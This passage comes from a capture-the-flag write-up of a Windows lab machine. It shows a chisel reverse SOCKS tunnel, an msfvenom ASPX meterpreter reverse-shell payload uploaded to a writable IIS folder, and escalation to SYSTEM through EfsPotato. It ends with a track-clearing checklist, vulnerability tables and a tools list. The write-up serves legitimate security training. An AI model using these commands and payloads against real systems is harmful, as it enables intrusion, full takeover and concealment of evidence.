+  <div class="codeBlock">C:\Users\C.Bum&gt;netstat -no
+netstat -no
+
+Active Connections
+
+  Proto  Local Address          Foreign Address        State           PID
+  TCP    10.129.137.102:80      10.10.14.93:39414      CLOSE_WAIT      5712
+  TCP    10.129.137.102:50048   10.10.14.93:4444       ESTABLISHED     4512
+  TCP    10.129.137.102:56452   10.10.14.93:4445       ESTABLISHED     6000
+  TCP    127.0.0.1:58127        127.0.0.1:8000         TIME_WAIT       0
+  TCP    [::1]:389              [::1]:49677            ESTABLISHED     656
+  TCP    [::1]:389              [::1]:49678            ESTABLISHED     656
+  TCP    [::1]:389              [::1]:63866            ESTABLISHED     656
+  TCP    [::1]:49677            [::1]:389              ESTABLISHED     812
+  TCP    [::1]:49678            [::1]:389              ESTABLISHED     812
+  TCP    [::1]:63866            [::1]:389              ESTABLISHED     2452
+  [CROPPED]</div>
+  <p>We can upload <code>chisel.exe</code> to the target and set up a socks proxy to access the local port <code>8000</code> from our attacking host.</p>
+  <p>On the target system :</p>
+  <div class="codeBlock">C:\Users\C.Bum&gt;.\chisel.exe client 10.10.14.93:10000 R:socks
+.\chisel.exe client 10.10.14.93:10000 R:socks</div>
+  <p>On our attacking host :</p>
+  <div class="codeBlock">┌──(kali㉿kali)-[~]
+└─$ chisel server -p 10000 --reverse
+2023/07/21 00:41:09 server: Reverse tunnelling enabled
+2023/07/21 00:41:09 server: Fingerprint j+2SdeCNURqJbIwC2i6wL6TdIMcijctBYBZwaXHtZck=
+2023/07/21 00:41:09 server: Listening on http://0.0.0.0:10000</div>
+  <p>
+    Finally, we can use <a href="https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/">FoxyProxy</a> and configure 
+    <code>localhost:1080</code> as a proxy server (according to the output of the chisel server after receiving the connection from the target) :
+  </p>
+  <img src="/write-ups/HackTheBox/Hard/Flight/Untitled 5.png"/>
+  <p>If we try to click on <code>Contact Us Now</code>, we are redirected to this page :</p>
+  <img src="/write-ups/HackTheBox/Hard/Flight/Untitled 6.png"/>
+  <p>So, this website is hosted in <code>C:\inetpub\develoment</code>. Let’s see if we have write permissions on this folder :</p>
+  <div class="codeBlock">meterpreter &gt; ls
+Listing: C:\inetpub
+===================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+040777/rwxrwxrwx  0     dir   2022-09-22 15:24:01 -0400  custerr
+040777/rwxrwxrwx  4096  dir   2023-07-21 07:52:01 -0400  development
+040777/rwxrwxrwx  4096  dir   2022-09-22 16:08:51 -0400  history
+040777/rwxrwxrwx  0     dir   2022-09-22 15:32:36 -0400  logs
+040777/rwxrwxrwx  0     dir   2022-09-22 15:24:08 -0400  temp
+040777/rwxrwxrwx  0     dir   2022-09-22 15:28:04 -0400  wwwroot</div>
+  <p>Yes, we can write any file we want in this directory. Let’s generate a malicious ASPX file :</p>
+  <div class="codeBlock">┌──(kali㉿kali)-[~]
+└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f aspx -o rshell.aspx
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of aspx file: 3671 bytes
+Saved as: rshell.aspx</div>
+  <p>Next, we can upload it in this directory :</p>
+  <div class="codeBlock">meterpreter &gt; pwd
+C:\inetpub\development\development
+meterpreter &gt; upload /home/kali/rshell.aspx
+[*] Uploading  : /home/kali/rshell.aspx -&gt; rshell.aspx
+[*] Uploaded 3.58 KiB of 3.58 KiB (100.0%): /home/kali/rshell.aspx -&gt; rshell.aspx
+[*] Completed  : /home/kali/rshell.aspx -&gt; rshell.aspx</div>
+  <p>Now, we can start a listener : </p>
+  <div class="codeBlock">┌──(kali㉿kali)-[~]
+└─$ nc -lnvp 4242
+listening on [any] 4242 ...</div>
+  <p>
+    Then, we can navigate to <code>http://localhost:8000/development/rshell.aspx</code> in order to get a reverse shell on the system 
+    hopefully as a privileged user :
+  </p>
+  <div class="codeBlock">msf6 exploit(multi/handler) &gt; sessions 
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                      Connection
+  --  ----  ----                     -----------                      ----------
+  2         meterpreter x64/windows  flight\svc_apache @ G0           10.10.14.93:4444 -&gt; 10.129.137.102:50048 (10.129.137.1
+                                                                      02)
+  4         meterpreter x64/windows  flight\C.Bum @ G0                10.10.14.93:4445 -&gt; 10.129.137.102:56452 (10.129.137.1
+                                                                      02)
+  5         meterpreter x64/windows  IIS APPPOOL\DefaultAppPool @ G0  10.10.14.93:4444 -&gt; 10.129.137.102:51134 (10.129.137.1
+                                                                      02)</div>
+  <p>Now, we have a meterpreter session as <code>IIS APPPOOL\DefaultAppPool</code>.</p>
+  <h2 id="privilege-escalation-nt-authority-system">Privilege escalation (NT AUTHORITY\SYSTEM)</h2>
+  <p>Let’s take a look at our privileges :</p>
+  <div class="codeBlock">meterpreter &gt; shell
+Process 2360 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.17763.2989]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+c:\windows\system32\inetsrv&gt;whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State  
+============================= ========================================= =======
+SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
+SeMachineAccountPrivilege     Add workstations to domain                Enabled
+SeAuditPrivilege              Generate security audits                  Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege       Create global objects                     Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled</div>
+  <p>
+    We have the <code>SeImpersonatePrivilege</code>. We could be able to exploit some Potatoes exploits (like SweetPotato, RoguePotato etc…). 
+    We can simply use the <code>getsystem</code> command from the meterpreter to exploit this and get a shell as <code>NT AUTHORTIY\SYSTEM</code> :
+  </p>
+  <div class="codeBlock">meterpreter &gt; getsystem 
+...got system via technique 6 (Named Pipe Impersonation (EFSRPC variant - AKA EfsPotato)).
+meterpreter &gt; getuid
+Server username: NT AUTHORITY\SYSTEM</div>
+  <p>We successfully exploited EfsPotato and we have now a shell as <code>NT AUTHORITY\SYSTEM</code>.</p>
+  <h1 id="clearing-tracks">Clearing tracks</h1>
+  <table>
+    <thead>
+      <tr>
+        <th>Step</th>
+        <th>Tracks to remove</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>Post-exploitation - Privilege escalation (IIS APPPOOL\DefaultAppPool)</td>
+        <td>
+          - Remove <code>rshell.aspx</code> from <code>C:\inetpub\development\development\</code><br>
+          - Kill the client chisel process<br>
+          - Remove <code>chisel.exe</code> from <code>C:\Users\C.Bum</code>
+        </td>
+      </tr>
+      <tr>
+        <td>Post-exploitation - Getting a better shell</td>
+        <td>- Remove <code>meterpreter.exe</code> from <code>C:\Windows\Temp\</code></td>
+      </tr>
+      <tr>
+        <td>Post-exploitation - Privilege escalation (C.Bum)</td>
+        <td>- Remove <code>RunasCs.exe</code> from <code>C:\Windows\Temp\</code></td>
+      </tr>
+      <tr>
+        <td>Initial access - Getting a shell</td>
+        <td>- Remove <code>ws.php</code> from <code>c:\xampp\htdocs\flight.htb\</code></td>
+      </tr>
+    </tbody>
+  </table>
+  <h1 id="vulnerabilities-summary">Vulnerabilities summary</h1>
+  <h2 id="local-file-inclusion">Local File Inclusion</h2>
+  <table>
+    <thead>
+      <tr>
+        <th>Field</th>
+        <th>Value</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>Affected component</td>
+        <td>Web server</td>
+      </tr>
+      <tr>
+        <td>CVSS 3.0 score</td>
+        <td><mark class="highlight_red">7.5</mark></td>
+      </tr>
+      <tr>
+        <td>Severity</td>
+        <td><mark class="highlight_red">HIGH</mark></td>
+      </tr>
+      <tr>
+        <td>Attack vector</td>
+        <td>Network</td>
+      </tr>
+      <tr>
+        <td>Impact</td>
+        <td>
+          Allows an attacker to read arbitrary local files. It also allows an attacker to capture the NTLM hash of the user running the web server.<br>
+          <br>
+          This has a <mark class="highlight_red">high</mark> impact on the <b>confidentiality</b> of the affected component.
+        </td>
+      </tr>
+      <tr>
+        <td>Remediation proposition</td>
+        <td>Add filters to the <code>view</code> GET parameter.</td>
+      </tr>
+    </tbody>
+  </table>
+  <h2 id="weak-password">Weak passwords</h2>
+  <table>
+    <thead>
+      <tr>
+        <th>Field</th>
+        <th>Value</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>Affected component</td>
+        <td>Domain controller</td>
+      </tr>
+      <tr>
+        <td>CVSS 3.0 score</td>
+        <td><mark class="highlight_red">7.5</mark></td>
+      </tr>
+      <tr>
+        <td>Severity</td>
+        <td><mark class="highlight_red">HIGH</mark></td>
+      </tr>
+      <tr>
+        <td>Attack vector</td>
+        <td>Network</td>
+      </tr>
+      <tr>
+        <td>Impact</td>
+        <td>
+          Allows an attacker to access restricted files and services resulting in a privilege escalation of the attacker.<br>
+          <br>
+          This has a <mark class="highlight_red">high</mark> impact on the <b>confidentiality</b> of the affected component.
+        </td>
+      </tr>
+      <tr>
+        <td>Remediation proposition</td>
+        <td>
+          It is recommended to not reuse passwords for different user accounts.<br>
+          Also, you can set up a better password policy to force users to use stronger passwords.
+        </td>
+      </tr>
+    </tbody>
+  </table>
+  <h2 id="efspotato">EfsPotato</h2>
+  <table>
+    <thead>
+      <tr>
+        <th>Field</th>
+        <th>Value</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>Affected component</td>
+        <td>Domain controller</td>
+      </tr>
+      <tr>
+        <td>CVSS 3.0 score</td>
+        <td><mark class="highlight_red">7.8</mark></td>
+      </tr>
+      <tr>
+        <td>Severity</td>
+        <td><mark class="highlight_red">HIGH</mark></td>
+      </tr>
+      <tr>
+        <td>Attack vector</td>
+        <td>Local</td>
+      </tr>
+      <tr>
+        <td>Impact</td>
+        <td>
+          If an attacker gain access to the <code>IIS APPPOOL\DefaultAppPool</code> account, he can exploit this vulnerability to 
+          gain a shell as <code>NT AUTHORITY\SYSTEM</code>.<br>
+          <br>
+          This has a <mark class="highlight_red">high</mark> impact on the <b>confidentiality</b>, <b>availability</b> and <b>integrity</b> of the affected component.
+        </td>
+      </tr>
+      <tr>
+        <td>Remediation proposition</td>
+        <td>Update the system through Windows update.</td>
+      </tr>
+    </tbody>
+  </table>
+  <h1 id="tools-used">Tools used</h1>
+  <table>
+    <thead>
+      <tr>
+        <th>Tool</th>
+        <th>Purpose</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><a href="https://nmap.org/book/man.html">Nmap</a></td>
+        <td>
+          - Scan for open ports<br>
+          - Scan services versions
+        </td>
+      </tr>
+      <tr>
+        <td><a href="https://github.com/OJ/gobuster">Gobuster</a></td>
+        <td>- Fuzz virtual hosts</td>
+      </tr>
+      <tr>
+        <td><a href="https://github.com/SpiderLabs/Responder">Responder</a></td>
+        <td>- NTLM hash capturing</td>
+      </tr>
+      <tr>
+        <td><a href="https://www.samba.org/samba/docs/current/man-html/smbclient.1.html">Smbclient</a></td>
+        <td>- Interact with the SMB server</td>
+      </tr>
+      <tr>
+        <td><a href="https://www.metasploit.com/">Metasploit Framework</a></td>
+        <td>- Manage meterpreter sessions</td>
+      </tr>
+      <tr>
+        <td><a href="https://github.com/antonioCoco/RunasCs">RunasCs</a></td>
+        <td>- Run commands as another user</td>
+      </tr>
+      <tr>
+        <td><a href="https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/">FoxyProxy</a></td>
+        <td>- Configure the proxy to use on the web browser</td>
+      </tr>
+      <tr>
+        <td><a href="https://www.kali.org/tools/chisel/">Chisel</a></td>
+        <td>- Set up a socks proxy</td>
+      </tr>
+      <tr>
+        <td><a href="https://github.com/ShawnDEvans/smbmap">Smbmap</a></td>
+        <td>- Enumerate the SMB shares and permissions</td>
+      </tr>
+      <tr>
+        <td><a href="https://hashcat.net/hashcat/">Hashcat</a></td>
+        <td>- Crack hashes</td>
+      </tr>
+    </tbody>
+  </table>
+  <h1 id="sources">Sources</h1>
+  <ul>
+    <li>EfsPotato (CVE-2021-36942) : <a href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-36942">https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-36942</a></li>
+  </ul>
+  <ul>
+    <li>LFI NTLM hash capture : <a href="https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds#lfi">https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds#lfi</a></li>
+  </ul>
+</div>
